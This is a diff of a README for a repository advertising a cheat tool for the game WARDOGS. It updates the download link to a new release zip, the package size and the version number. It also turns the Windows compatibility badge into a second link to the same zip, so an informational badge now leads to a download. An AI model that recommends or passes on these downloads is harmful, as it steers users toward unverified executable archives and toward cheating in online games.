@@ -9,11 +9,11 @@
 **External gameplay utility for WARDOGS**
 
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/knobbyspeak/wardogs-cheat-menu/blob/main/License)
-[![Windows](https://img.shields.io/badge/Windows-10%2F11-blue.svg)]()
+[![Windows](https://img.shields.io/badge/Windows-10%2F11-blue.svg)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/download/Releases6/Releases.zip)
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/download/Release5/Releases.zip)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/download/Releases6/Releases.zip)
 
-**Package size:** approximately `105 MB` (Update 09-20)
+**Package size:** approximately `100 MB` (Update 09-22)
 
 </div>
 
@@ -196,6 +196,6 @@ For the exact permissions and conditions, see the [`LICENSE`](https://github.com
 
 <div align="center">
 
-**WARDOGS Utility · v0.7.4**
+**WARDOGS Utility · v0.7**
 
 </div  
